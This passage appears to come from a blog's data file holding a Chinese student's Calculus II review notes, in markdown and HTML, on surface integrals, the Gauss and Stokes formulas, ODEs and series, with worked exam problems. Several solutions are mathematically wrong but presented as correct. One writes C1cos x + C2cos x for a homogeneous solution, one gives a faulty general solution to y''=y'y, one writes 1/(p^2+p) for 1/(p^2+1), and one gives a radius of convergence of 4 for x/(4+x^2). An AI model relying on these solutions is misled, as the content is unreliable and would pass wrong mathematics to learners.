\\\\\\\\\n&=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^2r^2\\cdot r\\mathrm{d}r \\\\\\\\\n&=8\\pi\n\\end{aligned}\n$$\n\n#### 4. 第一型曲面积分\n\n和第一型曲线积分一样直观，就是求一个曲面的面积。\n计算方法：\n$$\n\\iint \\limits_{\\Sigma} f(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}f[x,y,z(x,y)]\\sqrt{1+(\\frac{\\partial z}{\\partial x})^2+(\\frac{\\partial z}{\\partial y})^2}\\mathrm{d}x\\mathrm{d}y\n$$\n\n#### 5. 第二型曲面积分\n\n计算方法：\n$$\n\\iint \\limits_{\\Sigma} R(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}R[x,y,z(x,y)]\\mathrm{d}x\\mathrm{d}y\n$$\n\n两类曲面积分关系：\n$$\n\\iint \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iint \\limits_\\Sigma(Pcos\\alpha+Qcos\\beta+Rcos\\gamma)\\mathrm{d}S\n$$\n\n#### 6. 高斯公式与斯托克斯公式\n\n**高斯公式**：\n$$\n∯ \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z \\\\\\\\\nor ∯ \\limits_\\Sigma(P\\mathrm{cos}\\alpha+Q\\mathrm{cos}\\beta+R\\mathrm{cos}\\gamma)\\mathrm{d}S=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z\n$$\n**例**（2021-2022第二学期期末，3）计算曲面积分 $∯ \\limits_\\Sigma(x-z)\\mathrm{d}y\\mathrm{d}z+z\\mathrm{d}x\\mathrm{d}y$ ，其中 $\\Sigma$ 是由 $z=x^2+2y^2$ 与 $z=1$ 所围成立体表面的外侧。\n**解** $\\Sigma$ 是封闭曲面，直接上高斯公式，有\n$$\nI=\\iiint \\limits_\\Omega(1+1)\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z=2\\iiint \\limits_\\Omega\\mathrm{d}V\n$$\n作柱面坐标变换 $x=r\\cos\\theta,y=\\frac{r\\sin\\theta}{\\sqrt2}$ ，得\n$$\nI=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^1\\mathrm{d}r\\int_0^1\\frac{r}{\\sqrt{2}}dz=\\frac{\\pi}{\\sqrt2}\n$$\n> 直角坐标与柱面坐标关系：\n$$\n\\left\\\\{\n\\begin{aligned}\nx&=r\\cos\\theta \\\\\\\\\ny&=r\\sin\\theta \\\\\\\\\nz&=z\n\\end{aligned}\n\\right.\n$$\n此时 $\\mathrm{d}V=r\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}z$\n直角坐标与球面坐标关系：\n$$\n\\left\\\\{\n\\begin{aligned}\nx&=r\\sin\\varphi\\cos\\theta \\\\\\\\\ny&=r\\sin\\varphi\\sin\\theta \\\\\\\\\nz&=r\\cos\\varphi\n\\end{aligned}\n\\right.\n$$\n此时 $\\mathrm{d}V=r^2\\sin\\varphi\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}\\varphi$\n\n**斯托克斯公式**：\n$$\n∮_L P\\mathrm{d}x+Q\\mathrm{d}y+R\\mathrm{d}z=\\iint \\limits_\\Sigma\n\\begin{vmatrix}\n\\mathrm{d}y\\mathrm{d}z & \\mathrm{d}x\\mathrm{d}z & \\mathrm{d}x\\mathrm{d}y \\\\\\\\\n\\frac{\\partial}{\\partial x} & \\frac{\\partial}{\\partial y} & \\frac{\\partial}{\\partial z} \\\\\\\\\nP & Q & R\n\\end{vmatrix}=\n\\iint \\limits_\\Sigma\n\\begin{vmatrix}\n\\mathrm{cos}\\alpha & \\mathrm{cos}\\beta & \\mathrm{cos}\\gamma \\\\\\\\\n\\frac{\\partial}{\\partial x} & \\frac{\\partial}{\\partial y} & \\frac{\\partial}{\\partial z} \\\\\\\\\nP & Q & R\n\\end{vmatrix}\n\\mathrm{d}S\n$$\n\n### 第九章 常微分方程\n\n#### 1. 基本概念\n\n所谓常微分方程，就是区别于偏微分方程，未知函数是**一元函数**，而不是多元。\n常微分方程的阶数即肉眼可见的导数的最高阶，如 $y'''+2(y'')^3+y^2+x^5$ 就是三阶常微分方程。\n**通解**的概念：$n$ 阶常微分方程有解 $y=\\varphi(x;C_1,\\cdots,C_n)$ ，其中 $C_1,\\cdots,C_n$ 是 $n$ 个独立的任意常数，则称其为方程的一个通解；相对的，就有特解的概念，即方程的任何一个不包含任意常数的解。用数学语言表达独立性，有雅可比行列式不为零，即\n$$\n\\frac{D(\\varphi,\\varphi',\\cdots,\\varphi^{n-1})}{D(C_1,C_2,\\cdots,C_n)}\\ne0\n$$\n\n举个例子，经典方程 $y''+y=0$ 有解 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ ，则雅可比行列式为\n$$\n\\frac{D(y,y')}{D(C_1,C_2)}=\n\\begin{vmatrix}\n\\mathrm{sin}x & \\mathrm{cos}x \\\\\\\\\n\\mathrm{cos}x & -\\mathrm{sin}x\n\\end{vmatrix}\n=-1 \\ne 0\n$$\n可能你会问这个雅可比行列式具体怎么出來的，其实第一行就是 $y$ 分别对 $C_1$ 和 $C_2$ 求导，第二行是 $y'$ 对 $C_1$ 和 $C_2$ 求导。\n故 $C_1,C_2$ 是两个独立的任意常数，进而 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ 是方程的通解。\n\n#### 2. 初等积分法\n\n##### 2.1 变量分离的方程\n\n##### 2.2 可化为变量分离的几类方程\n\n##### 2.3 一阶线性微分方程\n\n形如\n$$\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)\n$$\n的一阶微分方程就叫一阶线性微分方程。\n一般套公式就行，若 $Q(x)\\equiv0$ ，则为齐次方程，直接积分有通解 $y=C\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}$ ；若为非齐次方程则用**常数变易法**求得通解\n$$\ny=\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}\\left[\\int Q(x)\\mathrm{e}^{\\int P(x)\\mathrm{d}x}dx+C\\right]\n$$\n然后还有**贝努里方程**（当然贝努利方程也是它，音译嘛）长这样：\n$$\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)y^n\\ (n\\ne0,1)\n$$\n作变量代换 $z=y^{1-n}$ ，可化为一阶线性方程\n$$\n\\frac{\\mathrm{d}z}{\\mathrm{d}x}+(1-n)P(x)z=(1-n)Q(x)\n$$\n\n##### 2.4 全微分方程与积分因子\n\n**例**（2021-2022第二学期期末，4）求微分方程 $x\\mathrm{d}y+(y+x^2)\\mathrm{d}x=0$ 的通解。\n**解** $\\frac{\\partial P}{\\partial y}=1=\\frac{\\partial Q}{\\partial x}$，且它们在全平面上连续，故方程为全微分方程。下求原函数 $u(x,y)$ ，由 $\\frac{\\partial u}{\\partial x}=P(x,y)=y+x^2$ ，对 $x$ 积分得\n$$\nu(x,y)=xy+\\frac{x^3}{3}+\\varphi(y)\n$$\n上式对 $y$ 求偏导得\n$$\n\\frac{\\partial u}{\\partial y}=x+\\varphi'(y)\n$$\n另一方面，\n$$\n\\frac{\\partial u}{\\partial y}=Q(x,y)=x\n$$\n比较上两式得 $\\varphi'(y)=0$ ，因而 $\\varphi(y)=0$（这里省略积分常数，不影响后面的通积分表达式），故原函数为 $u(x,y)=xy+\\frac{x^3}{3}$ ，故方程的通解为\n$$\nxy+\\frac{x^3}{3}=C\n$$\n其中 $C$ 为任意常数。\n> 微分方程的通解也叫通积分\n\n##### 2.5 可降阶的二阶微分方程\n\n**例**（2021-2022第二学期期末，5）求微分方程 $y''=y'\\cdot y$ 的通解。\n**解** 方程中不显含变量 $x$ ，令 $p=y'$ ，并将 $y$ 看作自变量，有 $y''=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有\n$$\np\\frac{\\mathrm{d}p}{\\mathrm{d}y}=p\\cdot y\n$$\n若 $p=y'=0$ ，则通解为 $y=C$ ，若 $p\\ne0$ ，则有\n$$\n\\begin{aligned}\n\\frac{\\mathrm{d}p}{\\mathrm{d}y}&=y \\\\\\\\\n\\int\\mathrm{d}p&=\\int y\\mathrm{d}y \\\\\\\\\np&=\\frac{1}{2}y^2+C_1\n\\end{aligned}\n$$\n即 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=\\frac{1}{2}y^2+C_1$ ，再次分离分量，有\n$$\n\\begin{aligned}\n\\frac{\\mathrm{d}y}{\\mathrm{d}x}&=\\frac{1}{2}y^2+C_1 \\\\\\\\\n\\int\\frac{2}{y^2}\\mathrm{d}y&=\\int\\mathrm{d}x + C_2 \\\\\\\\\n-\\frac{2}{y}&=x+C_3 \\\\\\\\\ny&=-\\frac{2}{x}+C\n\\end{aligned}\n$$\n> 这里面的常量 $C$ 变得我也很迷糊，但是结果代进去是对的，就先这样吧（）\n\n**例**（2020-2021第二学期期末，5）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}=(\\frac{\\mathrm{d}y}{\\mathrm{d}x})^3+\\frac{\\mathrm{d}y}{\\mathrm{d}x}$ 的通解。\n**解** 令 $p=y'$ ，有 $y''=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有\n$$\np\\frac{\\mathrm{d}p}{\\mathrm{d}y}=(p^3+p) \\\\\\\\\n\\frac{1}{p^2+p}\\mathrm{d}p=\\mathrm{d}y \\\\\\\\\n\\arctan p=y+C_1\n$$\n即有 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=p=\\tan(y+C_1)$ ，再次分离分量，有\n$$\n\\frac{\\mathrm{d}y}{\\tan(y+C_1)}=\\mathrm{d}x \\\\\\\\\n\\ln\\sin(y+C_1)=x+C_2\n$$\n最终得出 $y=\\arcsin e^{x+C_2}-C_1$\n\n#### 3. 微分方程解的存在唯一性定理\n\n#### 4. 高阶线性微分方程\n\n#### 5. 二阶线性常系数微分方程\n\n特征根 | 通解形式\n---------|----------\n两相异实根 $\\lambda_1,\\lambda_2$ | $C_1e^{\\lambda_1x}+C_2e^{\\lambda_2x}$\n二重根 $\\lambda_1$ | $(C_1+C_2x)e^{\\lambda_1x}$\n共轭复根 $\\lambda_{1,2}=\\alpha\\pm\\mathrm{i}\\beta$ | $e^{\\alpha x}(C_1\\cos\\beta x+C_2\\sin\\beta x)$\n\n$f(x)$ 的形式 | 条件 | 特解的形式\n---------|----------|---------\n$P_n(x)$ | “0”不是/是单/是重特征根 | $Q_n(x)/xQ_n(x)/x^2Q_n(x)$\n$ae^{\\alpha x}$ | $\\alpha$ 不是/是单/是重特征根 | $Ae^{\\alpha x}/Axe^{\\alpha x}/Ax^2e^{\\alpha x}$\n$a\\cos\\beta x+b\\sin\\beta x$ | $\\pm\\mathrm{i}\\beta$ 不是/是特征根 | $A\\cos\\beta x+B\\sin\\beta x/x(A\\cos\\beta x+B\\sin\\beta x)$\n$P_n(x)e^{\\alpha x}$ | $\\alpha$ 不是/是单/是重特征根 | $Q_n(x)e^{\\alpha x}/xQ_n(x)e^{\\alpha x}/x^2Q_n(x)e^{\\alpha x}$\n$P_n(x)e^{\\alpha x}(a\\cos\\beta x+b\\sin\\beta x)$ | $\\alpha\\pm\\mathrm{i}\\beta$ 不是/是特征根 | $e^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]/xe^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]$\n\n咋一看很多，其实挺有规律，比如多一个根就多乘一个 $x$ ，原来的系数变成待定的。\n\n**例**（2021-2022第二学期期末，6）求微分方程 $y''+y=e^{3x}(x+2)$ 的通解。\n**解** 先求对应齐次微分方程 $y''+y=0$ 的通解，特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故通解形式为\n$$\ny(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x\n$$\n其中 $C_1,C_2$ 为任意常数\n再用待定系数法求特解，“3“不是特征根，故设方程有特解 $y=(Ax+B)e^{3x}$ ，则\n$$\n\\begin{aligned}\ny'&=Ae^{3x}+3(Ax+B)e^{3x} \\\\\\\\\ny''&=3Ae^{3x}+3Ae^{3x}+9(Ax+B)e^{3x}=(9Ax+6A+9B)e^{3x} \\\\\\\\\n\\end{aligned}\n$$\n回代得\n$$\ny''+y=(10Ax+6A+10B)e^{3x}=e^{3x}(x+2)\n$$\n解得 $A=\\frac{1}{10},\\ B=\\frac{7}{50}$ ，故特解为 $y=(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$ ，与齐次方程通解相加，得出所求非齐次方程通解为\n$$\ny(x)=C_1\\cos x+C_2\\cos x+(\\frac{1}{10}x+\\frac{7}{50})e^{3x}\n$$\n其中 $C_1,C_2$ 为任意常数。\n\n**例**（2020-2021第二学期期末，6）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}+y=e^x+\\cos x$ 的通解。\n**解** 特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故齐次方程通解形式为\n$$\ny(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x\n$$\n这个方程的非齐次项由两项组成，就先分别求两项的特解，再相加，就是原方程的特解。\n对方程 $y''+y=e^x$ 不难求得特解 $y=\\frac{1}{2}e^x$ ，方程 $y''+y=\\cos x$ 的特解 $y=\\frac{1}{2}x\\cos x$ ，故原方程的特解为\n$$\ny=\\frac{1}{2}(e^x+x\\cos x)\n$$\n与齐次方程通解相加，得出所求非齐次方程通解为\n$$\ny(x)=C_1\\cos x+C_2\\cos x+\\frac{1}{2}(e^x+x\\cos x)\n$$\n\n#### 6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法\n\n#### 7. 常系数线性微分方程组\n\n### 第十章 无穷级数\n\n#### 1. 柯西收敛原理与数项级数的概念\n\n#### 2. 正项级数的收敛判别法\n\n1. 比较审敛法\n比收敛小的就收敛，比发散大的就发散\n2. 比值审敛法\n$\\lim\\limits_{n\\to\\infty}\\frac{u_{n+1}}{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定\n3. 根值审敛法\n与上面类似，$\\lim\\limits_{n\\to\\infty}\\sqrt[n]{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定\n4. 对数审敛法\n\n**例**（2021-2022第二学期期末，10-1）判断数项级数 $\\sum\\limits_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})$ 的敛散性。\n**解** 放缩一下再比较判别法\n$$\n\\sum_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})<\\sum_{n=1}^{\\infty}3^n(\\frac{\\pi}{4^n})=\\pi\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n\n$$\n由于 $\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$ 收敛，故原级数收敛。\n\n#### 3. 任意项级数\n\n**莱布尼茨判别法** 若交错级数满足下列条件：\n$$\n(1)u_n\\geqslant u_{n+1}; \\\\\\\\\n(2)\\lim_{n\\rightarrow\\infty}=0,\n$$\n则级数收敛。\n**狄利克雷判别法** 考虑级数\n$$\n\\sum_{k=1}^{\\infty}a_kb_k\n$$\n若序列 ${a_k}$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，又级数 $\\sum\\limits_{n=1}^{\\infty}b_k$ 的部分和序列有界，则级数 $\\sum\\limits_{k=1}^{\\infty}a_kb_k$ 收敛。\n**例**（2021-2022第二学期期末，10-2）判断数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 的敛散性。\n**解** 取 $a_k=\\frac{1}{\\ln n}$ ，易证得 $a_k$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，下证级数 $\\sum\\limits_{n=2}^{\\infty}\\cos(2n)$ 的部分和序列有界：\n$$\n\\begin{aligned}\n\\left|\\sum_{k=2}^{n}\\cos(2k)\\right|&=\\left|\\cos4+\\cos6+\\cdots+\\cos2n\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\cos4\\sin1+\\cos6\\sin1+\\cdots+\\cos2n\\sin1\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\frac{\\sin5-\\sin3}{2}+\\frac{\\sin7-\\sin5}{2}+\\cdots+\\frac{\\sin(2n+1)-\\sin(2n-1)}{2}\\right| \\\\\\\\\n&=\\frac{1}{\\sin1}\\left|\\frac{\\sin(2n+1)-\\sin3}{2}\\right| \\\\\\\\\n&\\leqslant\\frac{1}{\\sin1}\n\\end{aligned}\n$$\n故级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 收敛。\n> **积化和差公式**\n$$\n{\\displaystyle \\sin \\alpha \\cos \\beta ={\\sin(\\alpha +\\beta )+\\sin(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\cos \\alpha \\sin \\beta ={\\sin(\\alpha +\\beta )-\\sin(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\cos \\alpha \\cos \\beta ={\\cos(\\alpha +\\beta )+\\cos(\\alpha -\\beta ) \\over 2}} \\\\\\\\\n{\\displaystyle \\sin \\alpha \\sin \\beta ={\\cos(\\alpha +\\beta )-\\cos(\\alpha -\\beta ) \\over -2}}\n$$\n\n**阿贝尔判别法**\n（1）无穷数列 ${a_k}$ 单调有界\n（2）级数 $\\sum\\limits_{k=1}^\\infty b_k$ 收敛\n则级数 $\\sum\\limits_{k=1}^\\infty a_kb_k$ 收敛。\n\n#### 4. 函数项级数\n\n##### 4.1 函数序列及函数项级数的一致收敛性\n\n##### 4.2 函数项级数一致收敛的必要条件与判别法\n\n**强级数判别法** 若函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 的一般项满足：\n$$\n|u_n(x)|\\leqslant a_n,\\quad \\forall x\\in X,n=1,2,\\cdots,\n$$\n且正项级数 $\\sum\\limits_{n=1}^\\infty a_n$ 收敛，则该函数项级数在 $X$ 上一致收敛。\n\n**狄利克雷判别法** 与数项级数的狄利克雷判别法类似。\n（1）在 $X$ 中任意取定一个 $x$ ，数列 $\\{a_n(x)\\}$ 对 $n$ 单调，且函数序列 $\\{a_n(x)\\}$ 在 $X$ 上一致收敛于 $0$\n（2）函数项级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 的部分和序列 $\\{B_n(x)\\}$ 在 $X$ 上一致有界\n则 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。\n\n**阿贝尔判别法** 与数项级数的阿贝尔判别法类似。\n（1）在 $X$ 中任意取定一个 $x$ ，数列 $\\{a_n(x)\\}$ 单调，又函数序列 $\\{a_n(x)\\}$ 在 $X$ 上一致有界\n（2）级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 在 $X$ 上一致收敛\n则级数 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。\n\n##### 4.3 一致收敛级数的性质\n\n**和函数的连续性** 设函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上一致收敛，且其每一项 $u_n(x)$ 在 $[a,b]$ 上都连续，则其和函数 $S(x)=\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上也连续。\n\n**例**（2021-2022第二学期期末，11）考虑函数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{1}{n^2\\sqrt x}$ ，证明：\n（1）级数在 $(0,1)$ 上收敛\n（2）级数在 $(0,1)$ 上不一致收敛\n（3）级数的和函数 $S(x)$ 在 $(0,1)$ 上连续\n**解** （1）就是数项级数，随便证。\n（2）存在点列 $x_n=\\frac{1}{n^4}\\in(0,1)(n=1,2,\\cdots)$ 使 $u_n(x_n)=1$\n\n#### 5. 幂级数\n\n幂级数是**函数项级数的一种**，长这样：\n$$\na_0+a_1(x-x_0)+a_2(x-x_0)^2+\\cdots+a_n(x-x_0)^n+\\cdots\n$$\n\n##### 5.1 幂级数的收敛半径\n\n$$\n\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_{n+1}}{a_{n}}\\right|=l\n$$\n那么级数 $\\sum\\limits^n_{n=0}a_nx^n$ 的**收敛半径** $R=1/l$ ，当然直接反着除直接出也行。\n**收敛区间**就是 $(-R,R)$ ，**收敛域**就根据端点的收敛情况再修正下区间闭不闭合。\n\n**例**（2021-2022第二学期期末，8）求幂级数 $\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ 的收敛半径与和函数。\n**解**\n$$\n\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_n}{a_{n+1}}\\right|=\\lim_{n\\rightarrow\\infty}\\left|\\frac{n}{n+1}\\right|=1\n$$\n故收敛半径 $R=1$ ，收敛区间 $(-1,1)$ 。\n然后讨论两个端点，当 $x=1$ 时，原级数发散；当 $x=-1$ 时，原级数收敛，故收敛域为 $[-1,1)$\n设和函数 $S(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ ，则两边乘 $x$ 有 $xS(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^{n+1}$ ，两边求导有\n$$\n\\left[xS(x)\\right]'=\\sum\\limits^\\infty_{n=0}x^n=\\frac{1}{1-x}\n$$\n再两边求积，有\n$$\nxS(x)=\\int^x_0\\frac{1}{1-x}\\mathrm{d}x=-\\ln(1-x),\\ x\\in[-1,1)\n$$\n故当 $x\\ne0$ 时，$S(x)=-\\frac{1}{x}\\ln(1-x)$ ；当 $x=0$ 时，肉眼可见 $S(x)=1$ 。\n> 这里有个小 trick ，就是**幂级数里认定 $0^0=1$** ，至于为什么是这样，网上众说纷纭，读者可自行查阅。\n\n##### 5.2 幂级数的性质\n\n和函数项级数一样，可以逐项求积，也可以逐项求导。\n\n#### 6. 泰勒级数\n\n求函数在 $x=k$ 处的泰勒展开式就作 $t=x-k$ 变换，然后求出来的式子再代回去就行了。\n\n记一下常用的几条泰勒展开式：\n$$\n\\frac{1}{1-x}=1+x+x^2+x^3+\\cdots+x^n+\\cdots,\\ x\\in(-1,1)\\\\\\\\\ne^x=1+x+\\frac{x^2}{2!}+\\frac{x^3}{3!}+\\cdots+\\frac{x^n}{n!}+\\cdots\\\\\\\\\n\\sin x=x-\\frac{x^3}{3!}+\\frac{x^5}{5!}-\\frac{x^7}{7!}+\\cdots+(-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!}+\\cdots\\\\\\\\\n\\cos x=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}-\\frac{x^6}{6!}+\\cdots+(-1)^{n}\\frac{x^{2n}}{(2n)!}+\\cdots\\\\\\\\\n\\arctan x=x-\\frac{x^3}{3}+\\frac{x^5}{5}-\\frac{x^7}{7}+\\cdots+(-1)^{n}\\frac{x^{2n+1}}{(2n+1)}+\\cdots\\\\\\\\\n\\ln(1+x)=x-\\frac{x^2}{2}+\\frac{x^3}{3}-\\frac{x^4}{4}+\\cdots+(-1)^{n-1}\\frac{x^n}{n}+\\cdots\\\\\\\\\n(1+x)^\\alpha=1+\\alpha x+\\frac{\\alpha(\\alpha-1)}{2!}x^2+\\frac{\\alpha(\\alpha-1)(\\alpha-2)}{3!}x^3+\\cdots+\\frac{\\alpha(\\alpha-1)(\\alpha-2)\\cdots(\\alpha-n+1)}{n!}x^n+R_n(x)\n$$\n关于最后这个 $R_n(x)$ ，一堆证明后得出，当 $x\\in (-1,1)$ 时有 $\\lim\\limits_{n\\rightarrow \\infty}=0$\n\n**例**（2021-2022第二学期期末，10）求函数 $y=\\frac{x}{4+x^2}$ 在 $x=0$ 处的泰勒级数，并指出其收敛域。\n**解** $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，右边显然就是 $\\arctan x$ 导数的形式了，故我们由 $\\arctan x$ 的泰勒展开式逐项求导有\n$$\n\\frac{1}{1+x^2}=(\\arctan x)'=1-x^2+x^4-x^6+\\cdots+(-1)^{n}x^{2n}+\\cdots\n$$\n变形得\n$$\n\\frac{1}{1+(\\frac{x}{2})^2}=1-\\frac{x^2}{4}+\\frac{x^4}{16}-\\frac{x^6}{64}+\\cdots+(-1)^{n}\\frac{x^{2n}}{2^{2n}}+\\cdots\n$$\n最后代入 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，有\n$$\ny=\\frac{x}{4}-\\frac{x^3}{16}+\\frac{x^5}{64}-\\frac{x^7}{256}+\\cdots+(-1)^n\\frac{x^{2n+1}}{2^{2n+2}}+\\cdots\n$$\n那么级数形式为\n$$\ny=\\sum\\limits^\\infty_{n=0}\\frac{(-1)^n}{4^{n+1}}x^{2n+1}\n$$\n收敛半径 $R=\\lim\\limits_{n\\rightarrow\\infty}\\left|\\frac{(-1)^{n}}{4^{n+1}}\\cdot\\frac{4^{n+2}}{(-1)^{n+1}}\\right|=4$\n故收敛区间为 $(-4,4)$ ，当 $x=-4$ 时，\n","slug":"高数下笔记","published":1,"updated":"2023-05-19T14:28:10.133Z","_id":"cl8wgppps0040ck6g7g1odhn7","comments":1,"layout":"post","photos":[],"content":"<p>挂科了，还是要学好高数啊！</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>玩脱了，光顾着搞技术，绩点炸了。<br>高数 59 ，有人问我说我是不是得罪老师了——但是有没有一种可能，就是。。平时分已经给满了（）</p>\n<h2 id=\"笔记正文\"><a href=\"#笔记正文\" class=\"headerlink\" title=\"笔记正文\"></a>笔记正文</h2><h3 id=\"第六章-多元函数微分学\"><a href=\"#第六章-多元函数微分学\" class=\"headerlink\" title=\"第六章 多元函数微分学\"></a>第六章 多元函数微分学</h3><h4 id=\"1-多元函数\"><a href=\"#1-多元函数\" class=\"headerlink\" title=\"1. 多元函数\"></a>1. 多元函数</h4><h4 id=\"2-多元函数的极限\"><a href=\"#2-多元函数的极限\" class=\"headerlink\" title=\"2. 多元函数的极限\"></a>2. 多元函数的极限</h4><h4 id=\"3-多元函数的连续性\"><a href=\"#3-多元函数的连续性\" class=\"headerlink\" title=\"3. 多元函数的连续性\"></a>3. 多元函数的连续性</h4><h4 id=\"4-偏导数与全微分\"><a href=\"#4-偏导数与全微分\" class=\"headerlink\" title=\"4. 偏导数与全微分\"></a>4. 偏导数与全微分</h4><p><strong>例</strong>（2020-2021第二学期期末，1）确定实数 $\\alpha$ 的范围，使函数 $f(x,y)=\\left\\{<br>\\begin{aligned}<br>    (x^2+y^2)^\\alpha\\sin\\frac{1}{x^2+y^2},x^2+y^2\\neq0 \\\\<br>    0,x^2+y^2\\neq0<br>\\end{aligned}<br>\\right.$ 在 $(0,0)$ 处可微。<br><strong>解</strong><br>$$<br>\\lim_{x\\rightarrow0}\\frac{f(x,0)-f(0,0)}{x-0}=\\lim_{x\\rightarrow0}\\frac{x^{2\\alpha}\\sin\\frac{1}{x^2}}{x}=\\lim_{x\\rightarrow0}x^{2\\alpha-1}\\sin\\frac{1}{x^2}<br>$$<br>当 $2\\alpha-1&gt;0$ 时，极限为 $0$ ，即 $f_x’(0,0)=0$ ，此时类似地，有 $f_y’(0,0)=0$</p>\n<h4 id=\"5-复合函数与隐函数的微分法\"><a href=\"#5-复合函数与隐函数的微分法\" class=\"headerlink\" title=\"5. 复合函数与隐函数的微分法\"></a>5. 复合函数与隐函数的微分法</h4><h4 id=\"6-方向导数与梯度\"><a href=\"#6-方向导数与梯度\" class=\"headerlink\" title=\"6. 方向导数与梯度\"></a>6. 方向导数与梯度</h4><h4 id=\"7-多元函数的微分中值定理与泰勒公式\"><a href=\"#7-多元函数的微分中值定理与泰勒公式\" class=\"headerlink\" title=\"7. 多元函数的微分中值定理与泰勒公式\"></a>7. 多元函数的微分中值定理与泰勒公式</h4><h4 id=\"8-隐函数存在定理\"><a href=\"#8-隐函数存在定理\" class=\"headerlink\" title=\"8. 隐函数存在定理\"></a>8. 隐函数存在定理</h4><h4 id=\"9-极值问题\"><a href=\"#9-极值问题\" class=\"headerlink\" title=\"9. 极值问题\"></a>9. 极值问题</h4><p>先用 $f_x’=f_y’=0$ 求出稳定点，再令 $A=f_{xx},B=f_{xy},C=f_{yy}$ ，仅 $B^2 &lt; AC$ 时可以确定极值，此时 $A&gt;0$ 就是极小值， $A &lt; 0$ 就是极大值。与二元函数类似。</p>\n<p><strong>例</strong>（2021-2022第二学期期末，4）求多元函数 $f(x,y)=xe^{-\\frac{x^2+y^2}{2}}$ 的极值。<br><strong>解</strong> $f_x’=e^{-\\frac{x^2+y^2}{2}}(1-x^2),f_y’=e^{-\\frac{x^2+y^2}{2}}(-xy)$ ，令 $f_x’=f_y’=0$ ，得到 $(-1,0)$ 和 $(1,0)$ 两个稳定点。令 $A=f_{xx}=e^{-\\frac{x^2+y^2}{2}}(x^3-3x),B=f_{xy}=e^{-\\frac{x^2+y^2}{2}}(-y+x^2y),C=f_{yy}=e^{-\\frac{x^2+y^2}{2}}(-x+xy^2)$ ，代入 $(1,0)$ 得到 